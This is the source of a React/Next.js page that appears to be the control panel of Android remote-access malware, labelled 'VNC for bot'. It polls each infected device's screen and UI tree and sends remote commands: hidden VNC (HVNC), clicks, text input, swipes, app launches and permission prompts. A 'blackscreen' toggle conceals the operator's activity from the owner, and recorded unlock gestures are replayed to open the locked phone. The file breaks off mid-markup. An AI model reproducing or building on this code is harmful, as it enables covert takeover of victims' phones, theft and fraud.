import Head from 'next/head';
import { useRouter } from 'next/router'
import { Box, Button, Card, Container, Alert, List, Stack, Typography, Slider, Input, TextField , FormGroup, FormControlLabel, Checkbox, ListItem, ListItemIcon, Switch, ListItemText, Unstable_Grid2 as Grid, Tooltip, ButtonGroup, SvgIcon, IconButton, Hidden, TableContainer, Table, TableHead, TableRow, TableCell, Paper, TableBody, CardContent } from '@mui/material';
import { Layout as DashboardLayout } from 'src/layouts/dashboard/layout';
import { useEffect, useState, useRef } from 'react';
import $ from 'jquery';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome'
import { faAnglesDown, faAnglesLeft, faAnglesRight, faAnglesUp, faArrowDown, faArrowLeft, faArrowPointer, faCircle, faClosedCaptioning, faEye, faEyeSlash, faF, faFilePen, faFilm, faFont, faHand, faHandPointUp, faHouse, faKey, faLayerGroup, faListCheck, faLockOpen, faMobile, faMobileAndroid, faMobileButton, faMobileScreen, faMoon, faP, faPaperPlane, faPassport, faPause, faPen, faPlay, faPowerOff, faQuestion, faRepeat, faS, faSquare, faSquareArrowUpRight, faSquareCaretLeft, faSquareCheck, faStop, faTeeth, faTextHeight, faTextSlash, faUpRightFromSquare, faVolumeHigh } from '@fortawesome/free-solid-svg-icons';
import ScreenSize from '../../icons/screen-size';
import HandPointerLocation from '../../icons/hand-pointer-location';
import SliderComponent from '../../sections/ui/slider';
import SettingsContext from 'src/settings';
import Link from 'next/link';
import { el } from 'date-fns/locale';
import { checkperms } from 'src/utils/checkperms';
import { resolve } from 'path';
import Unlock from 'src/sections/vnc/unlock';
import Help from 'src/sections/vnc/help';
import Gesture from 'src/sections/vnc/gesture_info';
import Perms from 'src/sections/vnc/perms';
import axios from 'axios';
import * as d3 from 'd3';
import { set } from 'nprogress';
import Startapp from 'src/sections/vnc/startapp';

const Page = () => {


  // bot

  const router = useRouter()
  const { idbot } = router.query
  const [isLoading, setIsLoading] = useState(false);

  // window
  const [screenwidth, setScreenwidth] = useState(900)
  const [screenheight, setScreenheight] = useState(2400)
  const [scaleFactor, setScaleFactor] = useState(3)

  const [skeletonData, setSkeletonData] = useState([])
  const [isOnline, setIsOnline] = useState(false)


  const countRef = useRef(0);
  const cardRef = useRef(null);
  const [mouseDownAction, setMouseDownAction] = useState("click_coord");
  const [selectedChild, setSelectedChild] = useState(-1);
  const [mouseMoveCoords, setMouseMoveCoords] = useState({ x: 0, y: 0 });
  var selectedButton = 0;


  const [showEnterTextBox, setShowEnterTextBox] = useState(false);
  const [sendTextValue, setSendTextValue] = useState("");

  // blackscreen
  const [blackscreen, setBlackscreen] = useState(false);
  const [blackscreenon, setBlackscreenon] = useState(false);

  // views
  const [showViewsGroup, setShowViewsGroup] = useState(false);
  const [disabledViews, setDisabledViews] = useState([]);
  const [levels, setLevels] = useState([]);

  // other

  const [showTooltips, setshowTooltips] = useState(true);
  const [showText, setshowText] = useState(true);

  // vnc
  const [image, setImage] = useState("");
  const [vncActive, setVncActive] = useState(false);
  const [screenon, setScreenon] = useState(true);
  const [timesNoImage, setTimesNoImage] = useState(0);
  const [vncGettingActivated, setVncGettingActivated] = useState(false);
  const [vncShown,setVncShown] = useState(true);
  const [fps,setFps] = useState(1);

  const [count, setCount] = useState(0);
  const savedCallback = useRef();

  const [mousePositions, setMousePositions] = useState([]);
  const [isMouseDown, setIsMouseDown] = useState(false);
  const [startTime, setStartTime] = useState(null);
  const [endTime, setEndTime] = useState(null);

  const [hvnc, sethvnc] = useState(false)

  // gesture recording

  const [gestureData, setGestureData] = useState([]);
  const svgRef = useRef();
  const [pointsIndex, setPointsIndex] = useState(0);
  const [isAnimating, setIsAnimating] = useState(false);
  const [gesturePlaybackData, setgesturePlaybackData] = useState([]);
  const [isRecording, setisRecording] = useState(false);
  const [currentGesture, setCurrentGesture] =  useState("")
  const [unlockGesture, setunlockGesture] =  useState([])
  const [showGestureRecording, setshowGestureRecording] = useState(false)
  

  // info

  const tooltipTitle = screenon ? "screen is on" : "screen is off";

  // unlock screen

  const [openUnlockPopup, setopenUnlockPopup] = useState(false);

  // Gesture Popup

  const [openGesturePopups, setopenGesturePopups] = useState({});

  // Help

  const [openHelpPopup, setopenHelpPopup] = useState(false);

  // Permissions

  const [openPermsPopup, setOpenPermsPopup] = useState(false)

  // start app

  const [startAppPopup, setstartAppPopup] = useState(false)

  // styles

  var borderradius = 10;
  var height = 50;
  var width = 50;
  var bordercolor = "black";

  const [value, setValue] = useState(10)

  const handleSliderChange = (event, newValue) => {
    setValue(newValue);
  };

  const handleScaleSliderChange = (event, newValue) => {
    setScaleFactor(newValue);
  };

  const handleFpsSliderChange = (event, newValue) => {
    setFps(newValue);
  };

  const handleInputChange = (event) => {
    setValue(event.target.value === '' ? '' : Number(event.target.value));
  };

  const togglePopup = (rowId) => {
    setopenGesturePopups((prevState) => ({
      ...prevState,
      [rowId]: !prevState[rowId],
    }));
  };


  const handleBlur = () => {
    if (value < 0) {
      setValue(0);
    } else if (value > 50) {
      setValue(50);
    }
  };


  // clicking

  const handleMouseDown = (event) => {
    if (event.button !== 0) return;
    setIsMouseDown(true);
    setStartTime(Date.now());
    updateMousePositions(event);
  };

  const handleMouseUp = (event) => {
    if (event.button !== 0) return;
    setIsMouseDown(false);
    if (mousePositions.length >= 2) {
      setEndTime(Date.now());
      const duration = Date.now() - startTime;
      console.log("Duration: " + duration + "ms")
      console.log('Tracked positions:', mousePositions);
      handlecustomgesture(mousePositions, duration);
    }
    setMousePositions([]);
  };

  const handleRightClick = (event) => {
    event.preventDefault();
    if (mouseDownAction === "click_coord") {
      const cardElement = event.currentTarget.getBoundingClientRect();
      const position = {
        x: (event.clientX - cardElement.x) * scaleFactor, 
        y: (event.clientY - cardElement.y) * scaleFactor
      };
      console.log('Entered:', position);
      handleMouseDownCoordinates(position.x, position.y);
    } 

  };

  const handleMouseMove = (event) => {
    var cardRect = cardRef.current.getBoundingClientRect();
    var x = (event.clientX - cardRect.left)*scaleFactor;
    var y = (event.clientY - cardRect.top)*scaleFactor;
    setMouseMoveCoords({ x: x, y: y });
    if (isMouseDown) {
      updateMousePositions(event);
    }
  };

  const updateMousePositions = (event) => {
    const cardElement = event.currentTarget.getBoundingClientRect();
    setMousePositions((prevPositions) => [
      ...prevPositions,
      { x: (event.clientX - cardElement.x)*scaleFactor, y: (event.clientY - cardElement.y)*scaleFactor },
    ]);
  };

  const handleDouble = (index) => (event) => {
    event.preventDefault();
    if (selectedChild == index) {
      setSelectedChild(-1);
    } else {
      setSelectedChild(index);
      console.log(skeletonData[index].i)
    }
  }


  const getGestures = async () => {
    try {
      const res = await axios.get('/api/gestures/get_gesture?idbot=' + idbot);
      if (res.data.results) {
        setGestureData(res.data.results);
        console.log(res.data.results)
        console.log(JSON.parse(res.data.results[0].gesture).points)
        let data = res.data.results;
        
        let unlockgestures = data.filter(item => item.type === "unlock")
        for (let item of unlockgestures) {
          let parts = item.date.split(' ')[0].split('-');
          item.date = `${parts[2]}-${parts[1]}-${parts[0]} ${item.date.split(' ')[1]}`;
        }
        let unlockgesture = unlockgestures.sort((a,b) => new Date(b.date) - new Date(a.date));
        setunlockGesture(unlockgesture[0])
        
      }
    } catch (error) {
        console.log(error)
    }

  };

  const delGesture = async (id) => {
    try {
      const response = await fetch('/api/gestures/del_gesture', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ idbot: idbot, idgesture: id }),
      });

      if (response.ok) {
        const data = await response.json();
        console.log(data);
        getGestures();
      } else {
        console.log('Request failed');
      }
    } catch (error) {
      console.log('Error:', error);
    }

  };


  useEffect(() => {
    savedCallback.current = () => {
        setCount(count => count + 1);
    };
});

  useEffect(() => {
    if (!checkperms(1)){
      return
    }
    getGestures();


    async function SkeletonNodes() {
      try {
        setIsLoading(true)
          let request = $.ajax({
            type: 'GET',
            url: SettingsContext.vncApiUrl + "/get/" + idbot,
          });
          request.fail(function(){setIsOnline(false); sethvnc(false); setVncActive(false)})
          request.done(function(msg) {
            try {
              if (msg == "No such connection") {
                setIsOnline(false)
                sethvnc(false)
              } else if (msg == "hvnc_off") {
                setIsOnline(true)
                sethvnc(false)
                setVncActive(false)
              } else {
                sethvnc(true)
                setIsOnline(true)
                try {
                let msgnew = msg.replace(/\(MISSING\)/g, '')
                
                let response = (JSON.parse(msgnew))
              
                setScreenheight(response["h"])
                setScreenwidth(response["w"])
                
                setBlackscreenon(response.bl)
                setScreenon(response.sc)

                setImage(response["img"]);
                if (response["img"] !== "") {
                  setVncGettingActivated(false)
                }
                if (timesNoImage > 10) {
                  setVncActive(false)
                }
          
                setSkeletonData(response["nodes"])
                setVncActive(response.v)
    
                let levels = [];
                response["nodes"].map((node) => {
                  if (levels[node["lv"]] == undefined){
                    levels.push(node["lv"])
                  }
                })
    
                setLevels(levels)
              } catch (error){
                console.log(error)
              }
              }
              
      
            } catch (error) {
              console.log(error)
            }
    
    
          }.bind(this));
      } catch (error) {
        console.error('Error fetching data:', error);
      } finally {
        setIsLoading(false)
      }
      
      
    }

    const tick = () => {
      savedCallback.current();
      SkeletonNodes()
  };
  
  if (fps !== null) {
      const id = setInterval(tick, 1000/fps);
      return () => clearInterval(id);
  }

  }, [fps]);

  const sendCommand = (commandreq) => {
    let request = $.ajax({
      type: 'POST',
      url: SettingsContext.vncApiUrl + "/api",
      data: JSON.stringify(commandreq)
  });
  }

  useEffect(() => {
    try {
    const svg = d3.select(svgRef.current);
    const controller = new AbortController();
    const signal = controller.signal;

    if (isAnimating) {
      const pointsDataArray = gesturePlaybackData;
      const pointsData = pointsDataArray[pointsIndex];
      if (pointsData) {
        const durationPerPoint = pointsData.dur / pointsData.points.length;
  
        let pointIndex = 0;
  
        const animatePoint = () => {
          if (pointIndex >= pointsData.points.length) {
            if (pointsIndex < pointsDataArray.length - 1) {
                setPointsIndex(pointsIndex + 1);
                setIsAnimating(true);
            } else {
              setIsAnimating(false);
              pointIndex = 0;
              return;
            }
            return;
          }
    
          const point = pointsData.points[pointIndex];
          console.log(`Current point: ${JSON.stringify(point)}`);
          const x = Math.floor(point.x/scaleFactor);
          const y = Math.floor(point.y/scaleFactor);
  
          svg
          .append('circle')
          .data([point])
          .attr('cy', y)
          .attr('cx', x)
          .attr('r', 5)
          .attr('fill', 'red');
  
          pointIndex++;
          
          if (gesturePlaybackData.length > 0) {
            setTimeout(animatePoint, durationPerPoint);
          }
          
        }
    
        console.log(pointsData.last)
        setTimeout(() => {
          try {
              animatePoint();
          } catch (error)
          {
            console.log(error)
          }
        }, (pointsData.last));
  
      }


    }

    return () => {
      controller.abort();
    };
    } catch (error){
      console.log(error)
    }
  }, [isAnimating, gestureData, pointsIndex]);

    const handlestartGesturePlayback = (row) => {
      setCurrentGesture(row.uuid)
      const gesture = JSON.parse(row.gesture)
      const svg = d3.select(svgRef.current);
      svg.selectAll('circle').remove();
      setIsAnimating(true);
      setPointsIndex(0);
      console.log('Current Gesture:', gesture["points"]);
      setgesturePlaybackData(gesture["points"])
    };

    const isCurrentGesture = (id) => {
      if (id === currentGesture) {
        return true
      } else {
        return false
      }
    };

    const handleGestureClearClick = () => {
      const svg = d3.select(svgRef.current);
      svg.selectAll('circle').remove();
      setIsAnimating(false)
      setgesturePlaybackData([])
      setCurrentGesture("")
    };

    const handleExecGesture = (gesture) => {
      console.log(gesture["points"])
      handleexecrecordedgesture(gesture["points"])
    };

    const handleexecrecordedgesture = (pos) => {
      let commandreq = {
        "id": idbot,
        "command": "action_recorded_gesture",
        "data" : {
          "pos": pos,
        }
      };
      sendCommand(commandreq);
    }

  const handleCommand = (index) => {
    if(mouseDownAction == "action_click"){
      let commandreq = {
        "id": idbot,
        "command": "action_click",
        "data" : {
        "Node": index + 1,
        }
      };
      sendCommand(commandreq);
    } else if(mouseDownAction == "action_long_click"){
      let commandreq = {
        "id": idbot,
        "command": "action_long_click",
        "data" : {
        "Node": index + 1,
        }
      };
      sendCommand(commandreq);
    }
  }

  const handleMouseDownCoordinates = (x, y) => {
    let commandreq = {
      "id": idbot,
      "command": "click_coord",
      "data" : {
        "x": x,
        "y": y
      }
    };
    sendCommand(commandreq);
  }

  const handlecustomgesture = (pos, duration) => {
    let commandreq = {
      "id": idbot,
      "command": "action_custom_gesture",
      "data" : {
        "pos": pos,
        "duration": duration,
      }
    };
    sendCommand(commandreq);
  }

  const handleEditText = (index, text) => {
    let commandreq = {
      "id": idbot,
      "command": "action_edit_text",
      "data" : {
      "Node": index + 1,
      "Text": text
      }
    };
    sendCommand(commandreq);
    setSendTextValue('');
  }

  const handleGestureCommands = (command) => {
    let commandreq = {
      "id": idbot,
      "command": command,
      "data" : {}
    };
    sendCommand(commandreq);
  }

  const togglevnc = () => {
    if (!vncActive) {
    let commandreq = {
      "id": idbot,
      "command": "start_vnc",
      "data" : {}
    };
    sendCommand(commandreq);
    setVncGettingActivated(true);
    } else if (vncActive) {
      let commandreq = {
      "id": idbot,
      "command": "stop_vnc",
      "data" : {}
    };
    sendCommand(commandreq);
    }
    
  }

  const handleClick = (index) => {
    handleCommand(index)
    setSelectedChild(-1)
  };

  if (!checkperms(1)){
    return (
      <>
          <Head>
            <title>
              VNC
            </title>
          </Head>
          <Box
            component="main"
            sx={{
              flexGrow: 1,
              py: 8
            }}
          >
            <Container maxWidth="xl">
              <Stack spacing={3}>
                <div>
                <Link href="/bots" style={{ textDecoration: 'none' }}>
                    <Button
                      startIcon={(
                        <FontAwesomeIcon icon={faArrowLeft} />
                      )}
                      variant="contained"
                    >
                      Back
                    </Button>
                </Link>
                </div>
                <center><Typography fontSize={32}>You arent allowed here</Typography></center>
                </Stack>
                </Container>
          </Box>
      </>
    )
  }

  return (
  <>
    <Head>
      <title>
        VNC {idbot}
      </title>
    </Head>
    <Box
      component="main"
      sx={{
        flexGrow: 0,
        py: 8
      }}
    >
      <Container maxWidth="100%">
        <Stack spacing={3}>
        <div>
          <Link href="/bots" style={{ textDecoration: 'none' }}>
              <Button
                startIcon={(
                  <FontAwesomeIcon icon={faArrowLeft} />
                )}
                variant="contained"
              >
                Back
              </Button>
          </Link>
          <Button
            sx={{ml: 3}}
              startIcon={(
                <FontAwesomeIcon icon={faPlay} />
              )}
              variant="contained"
            onClick={() => handleGestureCommands("start_hvnc")}
            >
              Start HVNC
          </Button>
          <Button
            sx={{ml: 3}}
              startIcon={(
                <FontAwesomeIcon icon={faStop} />
              )}
              variant="contained"
            onClick={() => handleGestureCommands("stop_hvnc")}
            >
              Stop HVNC
          </Button>
          <Button
            sx={{ml: 3}}
              startIcon={(
                <FontAwesomeIcon icon={faLockOpen} />
              )}
              variant="contained"
            onClick={() => setopenUnlockPopup(true)}
            >
              Unlock Screen
          </Button>
          <Button
            sx={{ml: 3}}
              startIcon={(
                <FontAwesomeIcon icon={faListCheck} />
              )}
              variant="contained"
            onClick={() => setOpenPermsPopup(true)}
            >
              Perms
          </Button>
          <Button
            sx={{ml: 3}}
              startIcon={(
                <FontAwesomeIcon icon={faUpRightFromSquare} />
              )}
              variant="contained"
            onClick={() => setstartAppPopup(true)}
            >
              Start App
          </Button>
          {!showGestureRecording ? <Button
            sx={{ml: 3, width: 200}}
              startIcon={(
                <FontAwesomeIcon icon={faEye} />
              )}
              variant="contained"
            onClick={() => setshowGestureRecording(true)}
            >
              Show Recordings
          </Button> : <Button
            sx={{ml: 3, width: 250, minWidth: 250}}
              startIcon={(
                <FontAwesomeIcon icon={faEyeSlash} />
              )}
              variant="contained"
            onClick={() => setshowGestureRecording(false)}
            >
              Close GestureRecordings
          </Button>}
          <Button
            sx={{ml: 3}}
              startIcon={(
                <FontAwesomeIcon icon={faQuestion} />
              )}
              variant="contained"
            onClick={() => setopenHelpPopup(true)}
            >
              Help
          </Button>
          <Help
              openPopup={openHelpPopup}
              setOpenPopup={setopenHelpPopup}
              idbot={idbot}
              />
          <Unlock
              openPopup={openUnlockPopup}
              setOpenPopup={setopenUnlockPopup}
              idbot={idbot}
              unlockgesture={unlockGesture}
              />
          <Perms
              openPopup={openPermsPopup}
              setOpenPopup={setOpenPermsPopup}
              idbot={idbot}
              />
          <Startapp
              openPopup={startAppPopup}
              setOpenPopup={setstartAppPopup}
              idbot={idbot}
              />
          </div>
          <div>
            <Typography variant="h4">
              VNC for bot {idbot}
            </Typography>
          </div>
            <Grid
              container
              spacing={1}
            >
              <Grid item xs={12} sm={6} md={4}>

                
                <Card sx={{ height: '900px', width: '300px'}} >
                <CardContent>
                <div style={{ 
                      display: 'grid', 
                      gridTemplateColumns: 'repeat(4, 1fr)', 
                      gridGap: '1rem',
                    }}>
                      <Button
                        style={{                         
                          borderRadius: borderradius,
                          height: height,
                          minWidth: width,
                          width: width,
                          borderColor: bordercolor,
                          backgroundColor: 'white',
                          border: '1px solid #000000',
                        }}
                        onClick={() => handleGestureCommands("action_screen_on")}
                        variant={'outlined'}
                      >
                        <FontAwesomeIcon icon={faPowerOff} size="2x" color='#000000'/>
                      </Button>
                      <Button
                        style={{                         
                          borderRadius: borderradius,
                          height: height,
                          minWidth: width,
                          width: width,
                          borderColor: bordercolor,
                          backgroundColor: `${blackscreenon ? '#f6b13c' : 'white'}`,
                          border: `${blackscreenon ? '3px solid #000000' : '1px solid #000000'}`,
                        }}
                        onClick={() => {handleGestureCommands("nighty"); handleGestureCommands("action_blackscreen");}}
                        variant={'outlined'}
                      >
                        <FontAwesomeIcon icon={faMoon} size="2x" color='#000000'/>
                      </Button>
                      <Tooltip title={tooltipTitle}>
                      <Button
                        style={{
                          borderRadius: borderradius,
                          height: height,
                          minWidth: width,
                          width: width,
                          borderColor: bordercolor,
                          backgroundColor: 'white',
                          border: '1px solid #000000',
                        }}
                        variant={selectedButton === 1 ? 'contained' : 'outlined'}
                      >
                        {screenon === true ? <FontAwesomeIcon icon={faMobileScreen} size="2x" color='#000000'/> : <FontAwesomeIcon icon={faMobile} size="2x" color='#000000'/>}
                      </Button>
                      </Tooltip>
                      <Button
                        style={{                         
                          borderRadius: borderradius,
                          height: height,
                          minWidth: width,
                          width: width,
                          borderColor: bordercolor,
                          backgroundColor: `${showViewsGroup ? '#f6b13c' : 'white'}`,
                          border: `${showViewsGroup ? '3px solid #000000' : '1px solid #000000'}`,
                        }}
                        onClick={() => setShowViewsGroup(!showViewsGroup)}
                        variant={'outlined'}
                      >
                        <div>
                        <FontAwesomeIcon icon={faLayerGroup} size="2x" color='#000000'/>
                        </div>
                      </Button>
                    </div>
                    {showViewsGroup && (
                    <div>
                    <Typography variant="h5" component="h2" style={{ marginLeft: "18%" }}>
                      Availiable Views
                    </Typography>
                    <Box
                      height={150}
                      marginTop="10px"
                      marginLeft={1}
                      marginRight={1}
                      overflow="auto"
                      sx={{ overflowX: "hidden", border: '3px solid black', borderRadius: '10px'}}
                    >
                      <Grid container spacing={1} justifyItems="center">
                      {levels.map((item) => (
                        <Grid item xs={12} sm={3} key={item.id}>
                          <div
                          style={{
                            display: "flex",
                            flexDirection: "row",
                            alignItems: "center",
                            margin: "8px 0",
                          }}
                        >
                          <FormControlLabel
                            control={
                              <Checkbox
                                checked={!disabledViews.includes(item) ? true : false}
                                onChange={() => event.target.checked === false ? setDisabledViews([...disabledViews, item]) : setDisabledViews(disabledViews.filter((view) => view !== item))}
                                color="primary"
                              />
                            }
                            label={item}
                          />
                          </div>
                        </Grid>
                        ))}
                        </Grid>
                    </Box>
                    </div>
                    )}

                    

                    <div style={{ 
                      display: 'grid', 
                      gridTemplateColumns: 'repeat(4, 1fr)', 
                      gridGap: '1rem',
                      marginTop: '1rem'
                    }}>
                      <Button
                        style={{
                          borderRadius: borderradius,
                          height: height,
                          minWidth: width,
                          width: width,
                          borderColor: bordercolor,
                          backgroundColor: `${mouseDownAction === 'action_click' ? '#f6b13c' : 'white'}`,
                          border: `${mouseDownAction === 'action_click' ? '3px solid #000000' : '1px solid #000000'}`,
                        }}
                        onClick={() => setMouseDownAction("action_click")}
                        variant={selectedButton === 1 ? 'contained' : 'outlined'}
                      >
                        <FontAwesomeIcon icon={faHandPointUp} size="2x" color='#000000'/>
                      </Button>
                      <Button
                        style={{
                          borderRadius: borderradius,
                          height: height,
                          minWidth: width,
                          width: width,
                          borderColor: bordercolor,
                          backgroundColor: `${mouseDownAction === 'action_long_click' ? '#f6b13c' : 'white'}`,
                          border: `${mouseDownAction === 'action_long_click' ? '3px solid #000000' : '1px solid #000000'}`,
                        }}
                        onClick={() => setMouseDownAction("action_long_click")}
                        variant={selectedButton === 2 ? 'contained' : 'outlined'}
                      >
                        <FontAwesomeIcon icon={faHand} size="2x" color='#000000'/>
                      </Button>
                      <IconButton
                        id='click_coord'
                        style={{
                          borderRadius: borderradius,
                          height: height,
                          minWidth: width,
                          width: width,
                          color: 'white',
                          borderColor: bordercolor,
                          backgroundColor: `${mouseDownAction === 'click_coord' ? '#f6b13c' : 'white'}`,
                          border: `${mouseDownAction === 'click_coord' ? '3px solid #000000' : '1px solid #000000'}`
                        }}
                        variant='outlined'
                        onClick={() => setMouseDownAction("click_coord")}
                      >
                        <HandPointerLocation/>
                      </IconButton>
                      <Button
                        style={{
                          borderRadius: borderradius,
                          height: height,
                          minWidth: width,
                          width: width,
                          color: 'white',
                          borderColor: bordercolor,
                          backgroundColor: `${showEnterTextBox ? '#f6b13c' : 'white'}`,
                          border: `${showEnterTextBox ? '3px solid #000000' : '1px solid #000000'}`
                        }}
                        onClick={() => {showEnterTextBox ? setShowEnterTextBox(false) : setShowEnterTextBox(true)}}
                        variant={selectedButton === 3 ? 'contained' : 'outlined'}
                      >
                        <FontAwesomeIcon icon={faFilePen} size="2x" color='#000000'/>
                      </Button>
                    </div>
                    {showEnterTextBox && (
                      <div>
                        <TextField sx={{width: "200px",marginTop: '1rem', border: '2px solid #000000', borderRadius: "10px", height: "50px"}} hiddenLabel id="filled-basic" variant="filled" value={sendTextValue} onChange={(event) => setSendTextValue(event.target.value)} />
                        <Button
                        style={{
                          marginTop: '1rem',
                          marginLeft: '2px',
                          borderRadius: borderradius,
                          height: height,
                          minWidth: width,
                          width: width,
                          color: 'white',
                          borderColor: bordercolor,
                          border: '2px solid #000000'
                        }}
                        variant={'outlined'}
                        onClick={() => {
                        setShowEnterTextBox(false)
                        handleEditText(selectedChild, sendTextValue)
                        }}>
                          <FontAwesomeIcon icon={faPaperPlane} size="2x" color='#000000'/>
                        </Button>
                      </div>
                    )}

                    <center><Grid container width={280} mt={2} spacing={2} alignItems="center">
                      <Grid item>
                        <FontAwesomeIcon icon={faTextHeight} size="2x" />
                      </Grid>
                      <Grid item xs>
                        <Slider
                          value={typeof value === 'number' ? value : 0}
                          max={50}
                          onChange={handleSliderChange}
                          aria-labelledby="input-slider"
                        />
                      </Grid>
                      <Grid item>
                        <Input
                        sx={{ width: 42 }}
                          value={value}
                          size="small"
                          onChange={handleInputChange}
                          onBlur={handleBlur}
                          inputProps={{
                            step: 10,
                            min: 0,
                            max: 50,
                            type: 'number',
                            'aria-labelledby': 'input-slider',
                          }}
                        />
                      </Grid>
                    </Grid></center>

                    <center><Grid container width={280} spacing={2} alignItems="center">
                      <Grid item>
                          <ScreenSize color='#00000' />
                      </Grid>
                      <Grid item xs>
                        <Slider
                          value={scaleFactor}
                          step={0.5}
                          min={0.5}
                          max={5}
                          onChange={handleScaleSliderChange}
                          aria-labelledby="input-slider"
                        />
                      </Grid>
                      <Grid item>
                        <Input
                        sx={{ width: 42 }}
                          value={scaleFactor}
                          size="small"
                          onChange={() => setScaleFactor(event.target.value)}
                          onBlur={() => {
                          if (scaleFactor < 0) {
                            setScaleFactor(0);
                          } else if (scaleFactor > 5) {
                            setScaleFactor(5);
                          }}}
                          inputProps={{
                            step: 0.5,
                            min: 0.5,
                            max: 5,
                            type: 'number',
                            'aria-labelledby': 'input-slider',
                          }}
                        />
                      </Grid>
                    </Grid></center>

                    <center><Grid container width={280} spacing={2} alignItems="center">
                      <Grid item>
                          <FontAwesomeIcon icon={faF}/>
                          <FontAwesomeIcon icon={faP}/>
                          <FontAwesomeIcon icon={faS}/>
                      </Grid>
                      <Grid item xs>
                        <Slider
                          value={fps}
                          step={1}
                          min={1}
                          max={20}
                          onChange={handleFpsSliderChange}
                          aria-labelledby="input-slider"
                        />
                      </Grid>
                      <Grid item>
                        <Input
                        sx={{ width: 42 }}
                          value={fps}
                          size="small"
                          onChange={() => setFps(event.target.value)}
                          onBlur={() => {
                          if (fps < 0) {
                            setFps(0);
                          } else if (fps > 20) {
                            setFps(20);
                          }}}
                          inputProps={{
                            step: 1,
                            min: 1,
                            max: 20,
                            type: 'number',
                            'aria-labelledby': 'input-slider',
                          }}
                        />
                      </Grid>
                    </Grid></center>

                    <Grid container mt={2} spacing={1}><Grid item><Typography variant='h5' noWrap>Show Tooltips</Typography></Grid><Grid item><Switch style={{maxWidth: 50}} defaultChecked={showTooltips} onChange={()=> setshowTooltips(!showTooltips)} color='info'/></Grid></Grid>
                    <Grid container mt={0} spacing={1}><Grid item><Typography variant='h5' noWrap>Show Text</Typography></Grid><Grid ml={5.5} item><Switch style={{maxWidth: 50}} defaultChecked={showText} onChange={()=> setshowText(!showText)} color='info'/></Grid></Grid>

                    <div style={{ 
                      display: 'grid', 
                      gridTemplateColumns: 'repeat(4, 1fr)', 
                      gridGap: '1rem',
                      marginTop: '1rem'
                    }}>
                      <Button
                        style={{
                          borderRadius: borderradius,
                          height: height,
                          minWidth: width,
                          width: width,
                          borderColor: bordercolor,
                          backgroundColor: 'white',
                          border: '2px solid #000000',
                        }}
                        onClick={() => handleGestureCommands("swipe_left")}
                        variant={'outlined'}
                      >
                        <FontAwesomeIcon icon={faAnglesLeft} size="2x" color='#000000'/>
                      </Button>
                      <Button
                        style={{
                          borderRadius: borderradius,
                          height: height,
                          minWidth: width,
                          width: width,
                          borderColor: bordercolor,
                          backgroundColor: 'white',
                          border: '2px solid #000000',
                        }}
                        onClick={() => handleGestureCommands("swipe_up")}
                        variant={'outlined'}
                      >
                        <FontAwesomeIcon icon={faAnglesUp} size="2x" color='#000000'/>
                      </Button>
                      <Button
                        style={{
                          borderRadius: borderradius,
                          height: height,
                          minWidth: width,
                          width: width,
                          borderColor: bordercolor,
                          backgroundColor: 'white',
                          border: '2px solid #000000',
                        }}
                        onClick={() => handleGestureCommands("swipe_down")}
                        variant={'outlined'}
                      >
                        <FontAwesomeIcon icon={faAnglesDown} size="2x" color='#000000'/>
                      </Button>
                      <Button
                        style={{
                          borderRadius: borderradius,
                          height: height,
                          minWidth: width,
                          width: width,
                          color: 'white',
                          borderColor: bordercolor,
                          border: '2px solid #000000',
                        }}
                        onClick={(event) => handleGestureCommands("swipe_right")}
                        variant={'outlined'}
                      >
                        <FontAwesomeIcon icon={faAnglesRight} size="2x" color='#000000'/>
                      </Button>
                    </div>



                    <div style={{ 
                      display: 'grid', 
                      gridTemplateColumns: 'repeat(3, 1fr)', 
                      gridGap: '1rem',
                      margin: '2rem' // add margin to the container element
                    }}>
                      <Button
                        style={{
                          borderRadius: borderradius,
                          height: height,
                          minWidth: width,
                          width: width,
                          borderColor: bordercolor,
                          backgroundColor: 'white',
                          border: '2px solid #000000',
                        }}
                        onClick={() => handleGestureCommands("global_action_back")}
                        variant={'outlined'}
                      >
                        <FontAwesomeIcon icon={faSquareCaretLeft} size="2x" color='#000000'/>
                      </Button>
                      <Button
                        style={{
                          borderRadius: borderradius,
                          height: height,
                          minWidth: width,
                          width: width,
                          borderColor: bordercolor,
                          backgroundColor: 'white',
                          border: '2px solid #000000',
                        }}
                        onClick={() => handleGestureCommands("global_action_home")}
                        variant={'outlined'}
                      >
                        <FontAwesomeIcon icon={faCircle} size="2x" color='#000000'/>
                      </Button>
                      <Button
                        style={{
                          borderRadius: borderradius,
                          height: height,
                          minWidth: width,
                          width: width,
                          color: 'white',
                          borderColor: bordercolor,
                          border: '2px solid #000000',
                        }}
                        onClick={(event) => handleGestureCommands("global_action_recents")}
                        variant={'outlined'}
                      >
                        <FontAwesomeIcon icon={faSquare} size="2x" color='#000000'/>
                      </Button>
                    </div>

                    <center><Button
                        style={{         
                          marginTop: 20,                 
                          borderRadius: borderradius,
                          height: 50,
                          minWidth: '40%',
                          width: '40%',
                          borderColor: bordercolor,
                          backgroundColor: `${vncActive ? '#f6b13c' : 'white'}`,
                          border: `${vncActive ? '3px solid #000000' : '1px solid #000000'}`,
                        }}
                        onClick={(event) => togglevnc()}
                        variant={'outlined'}
                      >
                        <div>
                          <Typography variant="h4" color={'black'} component="div">VNC</Typography>
                        </div>
                    </Button></center>
                  
                    
                    {vncActive && ( 
                    <Grid container mt={2} alignItems="center" justifyContent="center" spacing={1}><Grid item><Typography variant='h5' noWrap>Show VNC</Typography></Grid><Grid item><Switch style={{maxWidth: 50}} defaultChecked={vncShown} onChange={()=> setVncShown(!vncShown)} color='info'/></Grid></Grid>
                    )}
                    
                    </CardContent>
                  </Card>
              </Grid>
              <Grid item xs={12} sm={6} md={4}>
                <Card  ref={cardRef} sx={{ height: (screenheight / scaleFactor) + "px", width: (screenwidth / scaleFactor) + "px", position: "relative" }}  onMouseDown={handleMouseDown} 
      onMouseUp={handleMouseUp} 
      onMouseMove={handleMouseMove} 
      onContextMenu={handleRightClick}>
        <CardContent >
                <div style={{position: 'absolute', top: 0, left: 0,width: '100%',height: '100%'}}>
                  <svg ref={svgRef} style={{ width: '100%', height: '100%' }} />
                </div>
                <div>
                    {vncActive === true && hvnc && screenon === true && isOnline && vncShown ? (<img style={{objectFit: 'cover', position: 'absolute', top: 0, left: 0,width: '100%',height: '100%'}} src={"data:image/png;base64," + image} draggable={false} alt="" width={(screenwidth / scaleFactor)} height={(screenheight / scaleFactor)} /> ) : null}
                    {skeletonData.length > 0 && isOnline && hvnc ? (
                    
                      skeletonData.map((node, index) => (
